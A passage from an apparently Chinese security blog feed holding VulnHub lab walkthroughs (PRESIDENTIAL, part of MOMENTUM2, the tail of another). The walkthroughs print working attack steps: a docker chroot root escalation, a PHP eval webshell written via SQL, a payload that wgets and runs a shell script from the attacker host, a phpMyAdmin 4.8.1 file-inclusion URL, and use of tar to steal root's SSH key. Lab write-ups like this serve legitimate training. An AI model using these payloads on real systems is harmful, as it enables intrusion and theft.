&lt;p&gt;用 python3 调整为一个比较美观的终端: &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-721.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;的时候发现属于docker组，尝试用docker提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整shell输出比较美观的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-722.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</id>
        <title>VULNHUB 29 PRESIDENTIAL</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==&#34;&gt;https://www.vulnhub.com/entry/presidential-1,500/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-723.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-724.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,2082&lt;/p&gt;
&lt;p&gt;发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-725.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-726.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有明显发现，对其目录结构进行扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-727.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==&#34;&gt;http://192.168.0.153/config.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-728.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=&#34;&gt;http://192.168.0.153/config.php.bak&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-729.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP&lt;/p&gt;
&lt;p&gt;但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-730.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，指定规则如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-731.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ZvdGVub3cubG9jYWw=&#34;&gt;http://votenow.local&lt;/span&gt; 成功显示出来该网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-732.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;做一波目录扫描，发现和原 ip 的扫描内容一模一样&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-733.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wfuzz-扫描子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-扫描子域名&#34;&gt;#&lt;/a&gt; wfuzz 扫描子域名&lt;/h3&gt;
&lt;p&gt;既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python subDomainsBrute.py votenow.local&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-734.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址&lt;/p&gt;
&lt;p&gt;用 wfuzz 来枚举子域名&lt;br&gt;
 &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &amp;quot;Host: FUZZ.votenow.local&amp;quot; --hw 854 --hc 400 votenow.local&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过这种方法收集的子域名的解析地址都是目标靶机的 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-735.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将扫描到的子域名加入到本地 hosts 文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-736.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=&#34;&gt;http://datasafe.votenow.local&lt;/span&gt; , 输入之前泄漏的数据库账户密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-737.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到 phpmyadmin 的权限&lt;/p&gt;
&lt;h3 id=&#34;phpmyadmin后台写shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin后台写shell&#34;&gt;#&lt;/a&gt; phpmyadmin 后台写 shell&lt;/h3&gt;
&lt;p&gt;点击 SQL，尝试执行敏感的 sql 语句，写入 webshell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-738.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-739.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;数据库当前操作用户拥有写权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-740.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;secure_file_priv 参数：&lt;br&gt;
&lt;strong&gt;NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入一句话后门：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;#x27;x&amp;#x27;]);?&amp;gt;&amp;#x27; INTO OUTFILE &amp;#x27;/var/lib/mysql/a.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-741.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-742.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-743.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpmyadmin-漏洞提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-漏洞提权&#34;&gt;#&lt;/a&gt; phpmyadmin 漏洞提权&lt;/h3&gt;
&lt;p&gt;接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-744.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-745.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 paylaod 复制到一个目录下，查阅后开始利用&lt;br&gt;
 &lt;code&gt;python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-746.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-747.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是依然没有反弹 shell 成功，需要进行手动复现&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在SQL语句上写入执行反弹shell的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php system(&amp;quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&amp;quot;);exit;?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-748.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-749.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-750.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限&lt;br&gt;
 &lt;code&gt;http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-751.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-752.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 apache 用户的网站权限&lt;/p&gt;
&lt;h3 id=&#34;恶意tar命令提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恶意tar命令提权&#34;&gt;#&lt;/a&gt; 恶意 tar 命令提权&lt;/h3&gt;
&lt;p&gt;搜索一下有没有相关文件的权限设置错误&lt;br&gt;
 &lt;code&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &#39;proc\|home&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发现找到一个 admin 组下的一个命令 tarS&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-753.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 /etc/passwd 确认我们能提权的账户有哪些  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
 发现有 admin 和 root 两个账户都存在 bash&lt;br&gt;
john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;/code&gt;  尝试提权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-754.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确认一下 admin 用户下是否有某些可执行文件的特权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;find&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &amp;#x27;proc\|home&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvf key.tar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-755.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口&lt;br&gt;
 &lt;code&gt;ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-756.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/</id>
        <title>VULNHUB 30 MOMENTUM2</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbW9tZW50dW0tMiw3MDIv&#34;&gt;https://www.vulnhub.com/entry/momentum-2,702/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F3d2VnZ2ZlL2FydGljbGUvZGV0YWlscy8xMTkzMjAwNDU=&#34;&gt;https://blog.csdn.net/qwweggfe/article/details/119320045&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 MOMENTUM2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt; &lt;br&gt;
 这次又换了个场所进行测试，所以识别到的 ip 就比较多了，通过 MAC 地址，可确定虚拟在 win 宿主机上的靶机地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-757.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.17&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.17&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-758.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc=&#34;&gt;http://192.168.31.17&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-759.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击检查源代码，看能不能有所发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-760.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么敏感的信息，就去爆破一波目录，还是用 gobuster 工具，指定后缀，指定字典式的暴力破解，也可以用 dirsearch 等工具，前提是找到一个比较好的字典&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-761.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了三个敏感的目录，依次访问这几个目录&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvYWpheC5waHAuYmFr&#34;&gt;http://192.168.31.17/ajax.php.bak&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-762.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;敏感数据泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#敏感数据泄露&#34;&gt;#&lt;/a&gt; 敏感数据泄露&lt;/h3&gt;
&lt;p&gt;直接可以下载的一个备份文件，下载下来查看一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-763.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现是一个 php 的备份文件，里边写了一个过滤文件的规则，如果 admin 按照如下设置，并且添加一个大写字母在最后，那么就去判断 post, 中是否有 secure 的字段为 val1d，如果有的话就允许上传 php 文件&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvZGFzaGJvYWQuaHRtbA==&#34;&gt;http://192.168.31.17/dashboad.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-764.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以上传文件，直接上传一个 shell.php 文件是被拒绝的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-765.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续查看第三个敏感网址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvb3dscy8=&#34;&gt;http://192.168.31.17/owls/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-766.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很有可能是上传文件之后的位置，可在这里进行文件的执行&lt;/p&gt;
&lt;p&gt;接下来的思路就是通过备份文件的提示进行 php 上传文件的绕过，在 dashboard.html 界面进行文件的上传，在再 oswl 页面进行文件的执行&lt;/p&gt;
&lt;h3 id=&#34;crunch-生成字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crunch-生成字典&#34;&gt;#&lt;/a&gt; crunch 生成字典&lt;/h3&gt;
&lt;p&gt;先通过 crunch 生成一个从 A-Z 的字典&lt;br&gt;
 &lt;code&gt;crunch 1 1 -t , -o pass.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-767.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将上传文件的数据包拦截下来，并通过 burp 重发数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-768.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;burp-重发数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-重发数据包&#34;&gt;#&lt;/a&gt; burp 重发数据包&lt;/h3&gt;
&lt;p&gt;添加 cookie 字段，与另外一个 post 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-769.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 cookie 字段中的最后一个字母设置为随机大写字母&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-770.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;加载通过 crunch 生成的字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-771.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;批量发包后发现没有得到有效的上传成功的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-772.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Owls 页面也没有新的后门上传成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-773.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意这个 post 字段有严格的规范，不能有丝毫的错误，这个字段类型和字段内容中间需要一个空行才可以&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-774.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次重发，在 R 处找到了上传成功的 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-775.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且在 owls 页面接收到了上传成功的后门文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-776.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行此后门，在监听端口的地方拿到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-777.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
